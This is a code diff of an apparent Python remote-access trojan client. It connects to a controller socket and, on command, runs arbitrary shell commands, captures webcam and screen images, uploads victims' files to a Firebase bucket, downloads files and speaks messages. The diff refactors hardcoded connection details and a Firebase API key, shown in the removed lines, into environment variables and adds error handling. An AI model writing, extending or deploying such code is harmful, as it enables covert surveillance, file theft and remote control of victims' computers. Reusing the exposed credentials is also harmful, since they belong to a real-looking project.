@@ -1,33 +1,35 @@
 import socket
 import subprocess
 import time
-
 import cv2
 import requests
 import pyrebase
 import pyautogui
 import pyttsx3
+from dotenv import load_dotenv
+import os
 
+load_dotenv()
 
 sock=socket.socket()
 engine = pyttsx3.init()
 
-ip="35.192.5.87"
+ip=os.getenv('IP')
 
-
-sock.connect(("{}".format(ip),3389))
+sock.connect((ip,int(os.getenv('PORT'))))
 
 config={
-  "apiKey": "AIzaSyCHWEjdWnyCFmIVV6goHc8tz7HSAKzcadA",
-  "projectId": "orbital-scene-352405",
-  "storageBucket": "orbital-scene-352405.appspot.com",
-  "serviceAccount":"service_key.json"
+  "apiKey": os.getenv('API_KEY'),
+  "authDomain": os.getenv('AUTH_DOMAIN='),
+  "databaseURL": os.getenv('DATABASE_URL'),
+  "projectId": os.getenv('PROJECT_ID'),
+  "storageBucket":os.getenv('STORAGE_BUCKET'),
+  "serviceAccount":os.getenv('SERVICE_KEY_PATH')
    }
 
 firebase=pyrebase.initialize_app(config)
 
 def say(a):
-
     engine.say(a)
     engine.runAndWait()
     send("d0ne")
@@ -105,28 +107,23 @@ def capture_webcam():
 while True:
     data=sock.recv(1024).decode().strip()
 
-
-    if "run" in data.split():
-
-        run_command(data.split(maxsplit=1)[1].strip())
-    elif data=="capture":
-        capture_webcam()
-    elif data=="screen capture":
-        screen_capture()
-    elif data.split(maxsplit=1)[0].strip()=="upload":
-        file=data.split(maxsplit=1)[1].strip()
-        upload(file,file.split("/")[-1])
-    elif data.split(maxsplit=1)[0].strip()=="download":
-        download(data.split(maxsplit=1)[1].strip(),data.split(maxsplit=1)[1].strip())
-    elif data.split(maxsplit=1)[0].strip()=="say":
-        say(data.split(maxsplit=1)[1].strip())
-    elif data=="bitch":
-        run_command("start https://www.youtube.com/watch?v=iik25wqIuFo")
-    elif data=="haunt":
-        download("hacked.gif","hacked.gif")
-        for i in range(50):
-            run_command("start hacked.gif")
-            say("You have been hacked")
-
-    else:
-        send("d0ne")
+    try:
+        if "run" in data.split():
+            run_command(data.split(maxsplit=1)[1].strip())
+        elif data=="capture":
+            capture_webcam()
+        elif data=="screen capture":
+            screen_capture()
+        elif data.split(maxsplit=1)[0].strip()=="upload":
+            file=data.split(maxsplit=1)[1].strip()
+            upload(file,file.split("/")[-1])
+        elif data.split(maxsplit=1)[0].strip()=="download":
+            download(data.split(maxsplit=1)[1].strip(),data.split(maxsplit=1)[1].strip())
+        elif data.split(maxsplit=1)[0].strip()=="say":
+            say(data.split(maxsplit=1)[1].strip())
+        elif data=="bitch":
+            run_command("start https://www.youtube.com/watch?v=iik25wqIuFo")
+        else:
+            send("d0ne")
+    except:
+        send('Failed')
